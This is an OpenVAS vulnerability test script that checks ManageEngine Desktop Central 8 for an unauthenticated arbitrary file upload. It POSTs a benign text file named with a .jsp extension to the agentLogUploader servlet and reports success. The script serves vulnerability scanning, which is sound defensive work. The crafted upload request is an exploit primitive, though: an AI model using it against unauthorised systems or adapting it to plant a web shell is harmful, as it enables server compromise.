###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_desktopcentral_file_upload_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# ManageEngine Desktop Central Arbitrary File Upload Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zohocorp:manageengine_desktop_central";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803777");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2013-11-20 12:28:14 +0530 (Wed, 20 Nov 2013)");
  script_name("ManageEngine Desktop Central Arbitrary File Upload Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_manage_engine_desktop_central_detect.nasl");
  script_mandatory_keys("ManageEngine/Desktop_Central/installed");
  script_require_ports("Services/www", 8020);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/29674");
  script_xref(name:"URL", value:"http://security-assessment.com/files/documents/advisory/DesktopCentral%20Arbitrary%20File%20Upload.pdf");
  script_xref(name:"URL", value:"http://www.manageengine.com/products/desktop-central");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to gain arbitrary code
  execution on the server.");

  script_tag(name:"affected", value:"ManageEngine Desktop Central 8.0.0 (build 80293 and below)");

  script_tag(name:"insight", value:"The flaw in the AgentLogUploadServlet. This servlet takes input from HTTP
  POST and constructs an output file on the server without performing any sanitisation or even checking if the caller is authenticated.");

  script_tag(name:"solution", value:"Apply the patch supplied by the vendor (Patch 80293)");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check whether it
  is able to create the file or not.");

  script_tag(name:"summary", value:"This host is running ManageEngine Desktop Central and is prone to arbitrary
  file upload vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

host = http_host_name( port:port );
vtstrings = get_vt_strings();
vtstring = vtstrings["default"];

postdata = "This file is uploaded by a " + vtstring + " for vulnerability testing";

file = vtstrings["lowercase_rand"] + '.jsp';

url = dir + "/agentLogUploader?computerName=DesktopCentral&domainName=webapps&customerId=1&filename=" + file;
sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: text/html;\r\n",
                 "Content-Length: ", strlen( postdata ), "\r\n",
                 "\r\n", postdata );
rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

if( rcvRes && rcvRes =~ "^HTTP/1\.[01] 200" && "X-dc-header: yes" >< rcvRes ) {
  report  = 'It was possible to upload the file "' + dir + '/' + file + '". Please delete this file.';
  report += '\n' + report_vuln_url( url:url, port:port );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );